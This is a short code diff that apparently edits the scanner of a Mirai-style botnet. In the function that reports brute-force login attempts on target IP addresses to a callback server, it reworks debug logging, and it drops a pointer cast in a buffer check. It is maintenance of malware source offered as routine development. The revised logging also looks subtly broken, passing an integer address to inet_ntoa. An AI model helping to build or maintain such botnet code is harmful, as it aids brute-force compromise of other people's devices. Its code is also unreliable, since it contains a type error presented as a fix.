@@ -1315,8 +1315,7 @@ static void report_brute_attempt(ipv4_t daddr, uint16_t dport)
     }
     
     SCANNER_DEBUG_LOG("Successfully connected to scanner callback for brute attempt");
-    SCANNER_DEBUG_LOG("Reporting brute force attempt for IP: %d.%d.%d.%d:%d", 
-        daddr & 0xff, (daddr >> 8) & 0xff, (daddr >> 16) & 0xff, (daddr >> 24) & 0xff, ntohs(dport));
+    SCANNER_DEBUG_LOG("Reporting brute force attempt for IP: %s:%d", inet_ntoa(daddr), ntohs(dport));
 
     // Send brute attempt report (different from successful compromise)
     uint8_t brute_flag = 1;  // Flag to indicate this is a brute attempt, not success
@@ -1357,8 +1356,7 @@ static void report_brute_attempt(ipv4_t daddr, uint16_t dport)
         return;
     }
     
-    SCANNER_DEBUG_LOG("Successfully sent brute force report for %d.%d.%d.%d:%d", 
-        daddr & 0xff, (daddr >> 8) & 0xff, (daddr >> 16) & 0xff, (daddr >> 24) & 0xff, ntohs(dport));
+    SCANNER_DEBUG_LOG("Successfully sent brute force report for %s:%d", inet_ntoa(daddr), ntohs(dport));
     
     // Wait a moment for scanListen to process the data
     usleep(100000);  // 100ms delay
@@ -1513,7 +1511,7 @@ static char *deobf(char *str, int *len)
 
 static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)
 {
-    uint8_t *end = (uint8_t *)conn->rdbuf + conn->rdbuf_pos;
+    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;
 
     return ptr + amount < end;
 }
